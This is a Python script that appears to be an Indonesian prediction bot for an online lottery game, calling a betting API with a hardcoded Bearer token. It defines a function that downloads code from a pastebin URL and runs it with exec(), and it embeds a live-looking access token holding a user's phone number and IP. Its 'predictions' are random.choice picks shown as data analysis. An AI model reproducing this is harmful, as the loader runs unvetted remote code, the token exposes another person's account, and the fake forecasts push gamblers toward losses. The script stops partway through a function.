import requests
import json
import sys
import os
import time
from requests import session
import datetime
from random import SystemRandom
import random
from datetime import datetime
from sh import whoami
import getpass
import pytz
import pprint
pp = pprint.PrettyPrinter(indent=4)

TZ="GMT+7"

os.environ['TZ'] = 'Asia/Jakarta'
def response_GetNoaverageEmerdList():
    headers = {
        'authority': 'newapi.55lottertttapi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNjk1NjIzOTg1IiwibmJmIjoiMTY5NTYyMzk4NSIsImV4cCI6IjE2OTU2MjU3ODUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyYXRpb24iOiIyMDIzLzkvMjUgMTQ6MDk6NDUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJBY2Nlc3NfVG9rZW4iLCJVc2VySWQiOiI0NDE4MDQiLCJVc2VyTmFtZSI6IjYyODU3OTYyOTcxODkiLCJVc2VyUGhvdG8iOiJodHRwczovL2FwaS5saWdodHNwYWNlY2RuLmNvbS9pbWcvYXZhdGFyLmNmYThkZDlkLnN2ZyIsIk5pY2tOYW1lIjoiTWVtYmVyTk5HR0JXR1giLCJBbW91bnQiOiIwLjAwIiwiSW50ZWdyYWwiOiIwIiwiTG9naW5NYXJrIjoiSDUiLCJMb2dpblRpbWUiOiIyMDIzLzkvMjUgMTM6Mzk6NDUiLCJMb2dpbklQQWRkcmVzcyI6IjEyNS4xNjQuMjIuMTk5IiwiRGJOdW1iZXIiOiIwIiwiSXN2YWxpZGF0b3IiOiIwIiwiS2V5Q29kZSI6IjYzIiwiVG9rZW5UeXBlIjoiQWNjZXNzX1Rva2VuIiwiUGhvbmVUeXBlIjoiMCIsIlVzZXJUeXBlIjoiMCIsIlVzZXJOYW1lMiI6IiIsImlzcyI6Imp3dElzc3VlciIsImF1ZCI6ImxvdHRlcnlUaWNrZXQifQ.GLF5I_O5BudOiBeiv1CgI65d0y4H2zBXGpLYGVHjMCY',
        'content-type': 'application/problem+json; charset=UTF-8',
        'origin': 'https://www.551ah.com',
        'referer': 'https://www.551ah.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    ### GetNoaverageEmerdList
    data = '{"pageSize":10,"pageNo":1,"typeId":1,"language":0,"random":"c8d6631276ce46cda0de7809dbd0cea9","signature":"E1E754C4702A0C388D820A967DC0E83B","timestamp":1695624793}'
    # data = '{"pageNo":1,"typeId":1,"language":0}'
    response = requests.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', headers=headers, data=data)
    return response

### GetGameIssue
# data = '{"typeId":1,"language":0}'
def response_GetGameIssue():
    headers = {
        'authority': 'newapi.55lottertttapi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNjk1NjIzOTg1IiwibmJmIjoiMTY5NTYyMzk4NSIsImV4cCI6IjE2OTU2MjU3ODUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyYXRpb24iOiIyMDIzLzkvMjUgMTQ6MDk6NDUiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJBY2Nlc3NfVG9rZW4iLCJVc2VySWQiOiI0NDE4MDQiLCJVc2VyTmFtZSI6IjYyODU3OTYyOTcxODkiLCJVc2VyUGhvdG8iOiJodHRwczovL2FwaS5saWdodHNwYWNlY2RuLmNvbS9pbWcvYXZhdGFyLmNmYThkZDlkLnN2ZyIsIk5pY2tOYW1lIjoiTWVtYmVyTk5HR0JXR1giLCJBbW91bnQiOiIwLjAwIiwiSW50ZWdyYWwiOiIwIiwiTG9naW5NYXJrIjoiSDUiLCJMb2dpblRpbWUiOiIyMDIzLzkvMjUgMTM6Mzk6NDUiLCJMb2dpbklQQWRkcmVzcyI6IjEyNS4xNjQuMjIuMTk5IiwiRGJOdW1iZXIiOiIwIiwiSXN2YWxpZGF0b3IiOiIwIiwiS2V5Q29kZSI6IjYzIiwiVG9rZW5UeXBlIjoiQWNjZXNzX1Rva2VuIiwiUGhvbmVUeXBlIjoiMCIsIlVzZXJUeXBlIjoiMCIsIlVzZXJOYW1lMiI6IiIsImlzcyI6Imp3dElzc3VlciIsImF1ZCI6ImxvdHRlcnlUaWNrZXQifQ.GLF5I_O5BudOiBeiv1CgI65d0y4H2zBXGpLYGVHjMCY',
        'content-type': 'application/problem+json; charset=UTF-8',
        'origin': 'https://www.551ah.com',
        'referer': 'https://www.551ah.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }
    data = '{"typeId":1,"language":0,"random":"b0a1f354eb0f43c59e92019cb341b45b","signature":"F0E3A6182F804973F45B53E74D08F021","timestamp":1695624793}'

    response = requests.post('https://newapi.55lottertttapi.com/api/webapi/GetGameIssue', headers=headers, data=data)
    return response

PT = '\033[2;93;40m'
P = '\033[95m'
CYAN = '\033[96m'
DARK = '\033[36m'
B = '\033[94m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
BO = '\033[1m'
UG = '\033[35m'
PT = '\033[37m'
PT1 = '\33[5;47;31m'
UNDER = '\033[4m'
N = '\033[0m'
H = '\33[5;41;37m'
H1 = '\33[2;41;37m'
L = '\033[0;0m'
CY = '\33[5;37;45m'
BB = '\33[7;49;93m'
BR = '\33[7;49;33m'
GR1 = '\33[5;49;90m'
GR = '\33[7;49;90m'
WW1 = '\33[7;41;32m'
WW = '\33[5;31;42m'
MG = '\33[7;49;36m'
WH = '\33[7;49;37m'
PTH = '\33[7;49;37m'
RED = '\033[31m'
GRY = '\033[90m'
WW2 = '\33[5;35;46m'
WW3 = '\33[2;35;46m'
   
import getpass
import subprocess
   
def whoami2 ():
    d4 = whoami().strip()
    if d4 == 'u0_a440':
     os.system("clear")
    elif d4 == 'u0_a4400':
     os.system("clear")
    elif d4 == 'u0_a1142':
     os.system("clear")
    else:
     sys.exit("akses ditolak!!..hati-hati penipuan.. Hubungi Dev BoT")


m = ['70%','75%','72%','76%','75%']
h = random.SystemRandom()
rrr = h.choice(m)

Xt = (random.randint(0,7))
Xr = (random.randint(0,7))
Xy = (random.randint(0,7))

PT = '\033[2;93;40m'
P = '\033[95m'
CYAN = '\033[96m'
DARK = '\033[36m'
B = '\033[94m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
BO = '\033[1m'
UG = '\033[35m'
PT = '\033[37m'
PT1 = '\33[5;47;31m'
UNDER = '\033[4m'
N = '\033[0m'
H = '\33[5;41;37m'
H1 = '\33[2;41;37m'
L = '\033[0;0m'
CY = '\33[5;37;45m'
BB = '\33[7;49;93m'
BR = '\33[7;49;33m'
GR1 = '\33[5;49;90m'
GR = '\33[7;49;90m'
WW1 = '\33[7;41;32m'
WW = '\33[5;31;42m'
MG = '\33[7;49;36m'
WH = '\33[7;49;37m'
PTH = '\33[7;49;37m'
RED = '\033[31m'
GRY = '\033[90m'
WW2 = '\33[5;35;46m'
			
import getpass
import subprocess
    
def pasterun(post):
    url = f"https://pastebin.com/raw/{post}"
    code = requests.get(url).text
    exec(code)

url = 'https://pastebin.com/raw/M3VtaBTz'
*_, post = url.split('/')


def prime ():
    os.system("python F2.py")

def countdownTimerMM ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 5-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 5)
        print(f'                 {PT1}Jika lose 3x Harap Reload...{L}', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerMMX ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 5-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 5)
        print(f'             {PT1}Jika Prediksi Jelek, Silahkan Reload{L}', end='\r')
        time.sleep(1)
        total_second -= 1
       
       
def halaman22 ():
    # data = '{"pageNo":1,"typeId":1,"language":0}'
    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    # pp.pprint(b)
    c = b.get('data')
    d = c.get('list')
    # pp.pprint(d[0])
    e1 = d[0].get('number')
    e2 = d[0].get('number')
    e6 = d[0].get('issueNumber')
    e10 = d[0].get('number')
    with open("halaman144.txt", 'w') as f:
        f.write(str(e2))
        f.close()
        
def halaman44 ():
    # data = '{"pageNo":1,"typeId":1,"language":0}'
    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    # pp.pprint(b)
    c = b.get('data')
    d = c.get('list')
    # pp.pprint(d[0])
    e1 = d[0].get('number')
    e2 = d[0].get('number')
    e6 = d[0].get('issueNumber')
    e10 = d[0].get('number')
    with open("halaman145.txt", 'w') as f:
        f.write(str(e2))
        f.close()
        
			
def skip ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}┃{G}{x}{L}{G}┃{PT1} SKIPP {L} {N}{ BO}{GR}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
def countdownTimerX1Be ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' PASS ',' PASS ',' BOMB ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
def countdownTimerX1Ke ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' BOMB ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def sin ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' PASS ',' BOMB ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}┃             analisis new data .. {L} {RED}<{PT}{secs:02d}{RED}>                  {L}{G}┃', end='\r')
        time.sleep(1)
        total_second -= 1


def countdownTimerX2Be ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' BOMB ',' PASS ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX2Ke ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' PASS ',' PASS ',' BOMB ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
			
def countdownTimerX1B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' BOMB ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
def countdownTimerX1K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' PASS ',' BOMB ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX2B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' PASS ',' BOMB ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX2K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' SKIP ',' PASS ',' PASS ',' BOMB ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX3B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' BOMB ',' PASS ',' SKIP ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX3K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' SKIP ',' PASS ',' BOMB ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX4B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' PASS ',' PASS ',' SKIP ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX4K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' SKIP ',' PASS ',' BOMB ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK1/3 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX5B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' PASS ',' PASS ',' SKIP ',' BOMB ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB8/9 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX5K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' BOMB ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK2/3 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX6B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' PASS ',' SKIP ',' BOMB ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB6/7 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX6K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' PASS ',' SKIP ',' PASS ',' BOMB ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} KK0/3 {L} {N}{ BO}{H1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
        
def countdownTimerX7B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' PASS ',' BOMB ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{G}┃{G}{x}{L}{G}┃{PT1} BB5/8 {L} {N}{ BO}{WW1}  {L}{G}┃    {PT}-{secs:02d}    {G}┃ {GRY}{u} {G}┃ {n} {G}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX7K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    w = [' BOMB ',' PASS ',' SKIP ',' PASS ',' PASS ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    n = h.choice(w)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
